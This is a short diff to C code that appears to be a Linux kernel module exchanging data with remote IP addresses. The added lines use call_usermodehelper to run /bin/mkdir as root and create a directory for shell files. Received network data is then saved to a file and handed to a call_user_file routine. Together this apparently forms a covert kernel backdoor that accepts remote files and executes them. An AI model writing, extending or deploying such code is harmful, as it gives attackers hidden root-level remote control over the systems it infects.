@@ -28,6 +28,7 @@ int send_data(unsigned int ip, unsigned short *buf, int size, unsigned int seq)
             break;
         case _WAIT:
             *buf = 0x0100 + pd->type;
+            print_data(pd);
             if (pd->type == TP_ACKN)
             {
                 del_data(&send_map, ip);
@@ -147,6 +148,22 @@ void recv_data(unsigned int ip, const unsigned short *buf, int size, unsigned in
                                 /* break; */
                             /* } */
                             /* filp_close(fp, NULL); */
+                            fp = filp_open(SHFILEPATH, O_DIRECTORY, S_IRUSR);
+                            if (IS_ERR(fp))
+                            {
+                                char *argv[] = {"/bin/mkdir", SHFILEPATH, NULL};
+                                static char *envp[] = {
+                                    "HOME=/",
+                                    "TERM=linux",
+                                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL 
+                                };
+
+                                call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+                            }
+                            else
+                            {
+                                filp_close(fp, NULL);
+                            }
                             save_to_file_q(fpath, pd);
                             call_user_file(fpath, ip);
                             break;
